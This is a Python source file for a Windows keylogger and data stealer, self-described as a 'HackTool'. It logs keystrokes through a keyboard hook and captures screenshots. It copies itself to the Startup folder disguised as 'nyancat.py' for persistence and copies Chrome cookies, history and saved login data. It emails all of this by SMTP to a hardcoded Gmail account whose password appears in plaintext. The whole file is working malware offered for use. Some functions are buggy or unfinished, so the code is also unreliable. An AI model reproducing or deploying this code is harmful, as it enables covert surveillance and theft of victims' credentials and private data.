# Imported libraries

import os, sys
import errno
import socket
import base64
import pyHook
import shutil
import signal
import smtplib
import getpass
import logging
import platform
import win32api
import pythoncom
import subprocess
import datetime
from PIL import ImageGrab

import urllib.request as urllib

from email import encoders as Encoders
from contextlib import closing
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# -----------------------

global passkey
passkey = "pollasnegras"

global userkey
userkey = "marcalexander333@gmail.com"

global mail
mail = [

		'marcalexander333@gmail.com',  # To
		'marcalexander333@gmail.com',  # From
		'smtp.gmail.com:587',          # SMTP Server:Port
		'marcalexander333',            # User
		'pollasnegras',                # Password
] 

# -----------------------

global buffer
buffer         = ''

global count_scr
count_scr      = 0

global count_letter
count_letter   = 0

global count_scremail
count_scremail = 0

global check_count
check_count    = 1000

global PUBLIC_ADDRESS
PUBLIC_ADDRESS = ""

# ------------------------

current_system_time = datetime.datetime.now()   # Get current system time

# In this keylogger a folder "Intel" is made in C:\Users\Public\
# The keystrokes are saved in Logs folder by the name of IntelRST.txt
# Screenshots are saved in a folder inside Logs
# 10 Screenshots are sent at a time and are moved to "ToZipScreenshots" for zipping them and send as attachment

path = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs")

# Screenshots are saved in this folder
path_to_screenshot = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", "Screenshots" )  

# Cookies will be moved to this folder
path_to_cookies = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs")

# This folder will contain 10 screenshots and will zipped and sent as attachment
generated_zipfile_location = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", "ToZipScreenshots")

# Contains keystrokes
file_log = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", "IntelRST.txt")  

currentdir = os.getcwd()    #Get current working directory
currentuser = getpass.getuser()  #Get current User

try:
	ip_address = socket.gethostbyname(socket.gethostname()) #Get Ip address
except:
	pass

try:
	os.makedirs(path)
	os.makedirs(generated_zipfile_location)
	os.makedirs(path_to_screenshot)

except OSError as exception:
	if exception.errno != errno.EEXIST:
		raise

# Function to check if the computer is connected to Internet
def isInternetConnected():
	try:
		response = urllib.urlopen('https://www.google.com')
		return True

	except:
		pass

	return False

def subprocess_args(include_stdout = True):
	if hasattr(subprocess, 'STARTUPINFO'):
		si = subprocess.STARTUPINFO()
		si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
		env = os.environ
	else:
		si = None
		env = None

	if include_stdout:
		ret = {'stdout:': subprocess.PIPE}
	else:
		ret = {}

	ret.update({'stdin': subprocess.PIPE,
				'stderr': subprocess.PIPE,
				'startupinfo': si,
				'env': env })
	return ret

# Function to get the Process ID
def getProcessId(process_name):
	return [item.split()[1] for item in os.popen('tasklist').read().splitlines()[4:] if process_name in item.split()]

# Function to get the Public IP
def getSlavePublicAddress():
	try:
		return urllib.urlopen('http://ip.42.pl/raw').read()
	except:
		pass

# Function to get the System information
def getsystemInformation():
	return platform.uname()

# Function to get the output of command ipconfig /all
def getIPConfig():
	try:
		ipcfg_file = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", "ipcfg.txt")
		f = open(ipcfg_file, "w")
		f.write(subprocess.check_output(["ipconfig", "/all"], **subprocess_args(False)))
		f.close()

	except Exception as e:
		pass

# Function to combine all the slave information and save in the info.txt file
def getslaveInfo():
	slave_info = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", "info.txt")
	open_slave_info = open(slave_info, "w")


	open_slave_info.write("\n------------------------------\n")
	try:
		open_slave_info.write(PUBLIC_ADDRESS + "\n")
	except Exception as e:
		pass

	open_slave_info.write("\n------------------------------\n")
	try:
		open_slave_info.write(' '.join(str(s) for s in getsystemInformation()) + '\n')
	except Exception as e:
		pass

	open_slave_info.close()

	
def copyToStartup():

	"""Copy the current executable to MS Windows Startup"""

	original_filename = "sniffer.py"   # TODO: CAMBIAR
	new_filename      = 'nyancat.py' # The file will be copied to startup folder by this name

	copytodir   = os.path.join("C:" + os.path.sep, "Users", currentuser ,"AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	copyfromdir = os.path.join(currentdir, original_filename)

	filesindir = os.listdir(copytodir)

	if new_filename not in filesindir:
		shutil.copy2(copyfromdir, copytodir + new_filename)

	else:
		sys.exit() # El HackTool ya se ha ejecutado previamente, abortar la ejecucion

def walkAllDirectories():
	"""List directory content up to level 3"""

	# TODO: Reformat everything, this is a complete chaos

	file_dir1 = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", "Dir_View.txt")   #The drive hierarchy will be saved in this file

def sendAsZipFile(filename):

	global mail

	"""Send the data i.e. info.txt, chrome data, login data, screenshots via email as a zipfile"""

	attach = os.path.join("C:" + os.path.sep, "Users", "Public", "Intel", "Logs", filename + ".zip")

	current_timestamp = current_system_time.strftime("%Y%m%d-%H%M%S")
	SUBJECT = "Attachment " + "From --> " + currentuser + " Time --> " + str(current_timestamp)
	TEXT    = f"Sent by client {currentuser}:{PUBLIC_ADDRESS}" 
	
	msg            = MIMEMultipart() 
	msg['To']      = mail[0]
	msg['From']    = mail[1]
	msg['Subject'] = SUBJECT

	msg.attach(MIMEText(TEXT, 'plain'))
	fp = open(attach,'rb')

	attach2 = MIMEBase('multipart', 'encrypted') 
	attach2.set_payload(fp.read())
	encoders.encode_base64(attach2)
	attach2.add_header('Content-Disposition', 'attachment', filename = attach)

	msg.attach(attach2) 
	server = smtplib.SMTP(mail[2]) 
	server.ehlo()
	server.starttls() 
	server.login(mail[3],mail[4])
	server.sendmail(mail[0], mail[1], msg.as_string()) 				
	fp.close()


def cookieGrabber():

	"""Obtains Google Chrome Cookies"""

	cookiepath = os.path.join(
		os.environ["HOMEDRIVE"] + os.path.sep, 
		"Users", os.environ["HOMEPATH"].split(os.path.sep)[-1], "AppData", 
		"Local", "Google", "Chrome", "User Data", "Default"
		)

	cookiefile    = 'Cookies'
	historyfile   = 'History'
	LoginDatafile = "Login Data"

	copycookie    = os.path.join(cookiepath, cookiefile)
	copyhistory   = os.path.join(cookiepath, historyfile)
	copyLoginData = os.path.join(cookiepath, LoginDatafile)

	filesindir = os.listdir(path_to_cookies)

	if copycookie not in filesindir:
		shutil.copy2(copycookie, path_to_cookies)

	if copyhistory not in filesindir:
		shutil.copy2(copyhistory, path_to_cookies)

	if copyLoginData not in filesindir:
		shutil.copy2(copyLoginData, path_to_cookies)


def moveAttachmentsToSingleLocation(file_type):

	"""Moves all the files to be sent via email to one place"""

	current_files_location = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", file_type)
	
	if file_type == 'Screenshots':
		files = os.listdir(current_files_location)

		for i in range(20):
			shutil.move(os.path.join(current_files_location, files[i]), generated_zipfile_location)

	else:
		shutil.move(current_files_location, generated_zipfile_location)


def zipAttachments(file_type):

	"""Zips all the attachments in order to prepare them to be sent"""

	current_files_location = os.path.join("C:" + os.path.sep,"Users", "Public", "Intel", "Logs", file_type + "Attachments")
	files_in_dir = os.listdir(generated_zipfile_location)
	shutil.make_archive(current_files_location, 'zip', generated_zipfile_location)
	
	# Once zipped, delete previously moved files to save disk space
	for file_ in files_in_dir:
		os.remove(os.path.join(generated_zipfile_location, file_))


def takeScreenShoot():
	current_timestamp = current_system_time.strftime("%Y%m%d-%H%M%S")
	scrimg = ImageGrab.grab()
	scrimg.save(os.path.join(path_to_screenshot, str(current_timestamp) + ".png"))

def sendKeystrokesByMail():

	global mail

	log_text = open(file_log, "rb")

	data_buffer = ""

	if isInternetConnected() == True:
		for line in log_text:
			data_buffer += str(line)

		current_timestamp = current_system_time.strftime("%Y%m%d-%H%M%S")
		SUBJECT = "Keylogger data " + "from --> " + currentuser + " Time --> " + str(current_timestamp)
		MESSAGE = data_buffer + '\n\nUSER : ' + currentuser + '\nIP address : ' + ip_address

		msg = MIMEMultipart() 
		msg['To'] = mail[0]
		msg['From'] = mail[1]
		msg['Subject'] = SUBJECT
		msg.attach(MIMEText(MESSAGE,'plain')) 

		server = smtplib.SMTP(mail[2]) 
		server.ehlo()
		server.starttls() 				
		server.login(mail[3],mail[4]) 
		server.sendmail(mail[0], mail[1], msg.as_string()) 								
		server.quit()

		data = ''
		server.close()
		log_text = open(file_log, 'w')
		log_text.close()


def OnKeyboardEvent(event):
	global count_letter
	global count_scr
	global count_scremail
	global buffer

	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	
	print(chr(event.Ascii))
	print("\nTyped {} letters".format(count_letter))
	
	if event.Ascii == 13:
	  
		buffer = current_system_time.strftime("%d/%m/%Y-%H|%M|%S") + ": " + buffer
		logging.log(10, buffer)
		buffer = ''
		count_letter = count_letter + 1
		count_scr = count_scr + 1
		
	elif event.Ascii == 8:
	  
		buffer = buffer[:-1]
		count_letter = count_letter + 1
		count_scr = count_scr + 1
		
	elif event.Ascii == 9:
	  
		keys = '\t'
		buffer = buffer + keys
		count_letter = count_letter + 1
		count_scr = count_scr + 1
		
	elif event.Ascii >= 32 and event.Ascii <= 127:
	  
		keys = chr(event.Ascii)
		buffer = buffer + keys
		count_letter = count_letter + 1
		count_scr = count_scr + 1

	if count_letter == 300:
		count_letter = 0
		sendKeystrokesByMail()

	if count_scr == 250:
		print("Sending Mail")
		count_scr = 0
		takeScreenShoot()
		count_scremail +=  1

		if count_scremail == 20:
			count_scremail = 0

			moveAttachmentsToSingleLocation('Screenshots')
			zipAttachments('Screenshots')
			sendAsZipFile("ScreenshotsAttachments")
			
	return 0

def startHackTool():
	
	global count_scr
	global count_letter
	global count_scremail
	global check_count
	global PUBLIC_ADDRESS
	global mail

	try:
		copyToStartup() # Quite descriptive I think xd

	except: pass

	if isInternetConnected() == True: # Cool, now let's go

		try:
			PUBLIC_ADDRESS = getSlavePublicAddress()
	
		except:
			PUBLIC_ADDRESS = "E.RR.O.R"

		if check_count == 1000:

			# Restart check_count
			check_count = 0

			files_in_dir = os.listdir(path)

			# If there isn't a Payload, create one by packing the necesary files
			if not (f"{PUBLIC_ADDRESS}_Attachments.zip" in files_in_dir):
				
				# walkAllDirectories()  # TODO: Modify this function

				# Obtener Cookies
				try:
					cookieGrabber()
				except: pass

				# Ipconfig
				try:
					getIPConfig()
				except: pass

				# Slave Information
				try:
					getslaveInfo()
				except: pass

				# Moving the attachment before zipping them and send
				try:
					moveAttachmentsToSingleLocation('Dir_View.txt')
				except: pass

				try:
					moveAttachmentsToSingleLocation('History')
				except: pass
					
				try:
					moveAttachmentsToSingleLocation('Login Data')
				except: pass
					
				try:
					moveAttachmentsToSingleLocation('Cookies')
				except: pass
					
				try:
					moveAttachmentsToSingleLocation('ipcfg.txt')
				except: pass
					
				try:
					moveAttachmentsToSingleLocation('info.txt')
				except: pass
				
				try:
					zipAttachments(f'{PUBLIC_ADDRESS}')
					sendAsZipFile(f"{PUBLIC_ADDRESS}_Attachments", ".zip")
				except: pass

			current_timestamp = current_system_time.strftime("%Y%m%d-%H%M%S")
			SUBJECT = currentuser + ' : Slave is connected '
			MESSAGE = 'IP Address ---> ' + ip_address + '\nTime --> ' + str(current_timestamp)

			msg = MIMEMultipart() 
			msg['To'] = mail[0]
			msg['From'] = mail[1]
			msg['Subject'] = SUBJECT

			msg.attach(MIMEText(MESSAGE,'plain'))							
			server = smtplib.SMTP(mail[2]) 
			server.ehlo()
			server.starttls() 				
			server.login(mail[3],mail[4]) 
			server.sendmail(mail[0], mail[1], msg.as_string()) 								
			server.quit()

startHackTool()

try:
	hm = pyHook.HookManager()
	hm.KeyDown = OnKeyboardEvent
	hm.HookKeyboard()
	pythoncom.PumpMessages()
	
except: pass
	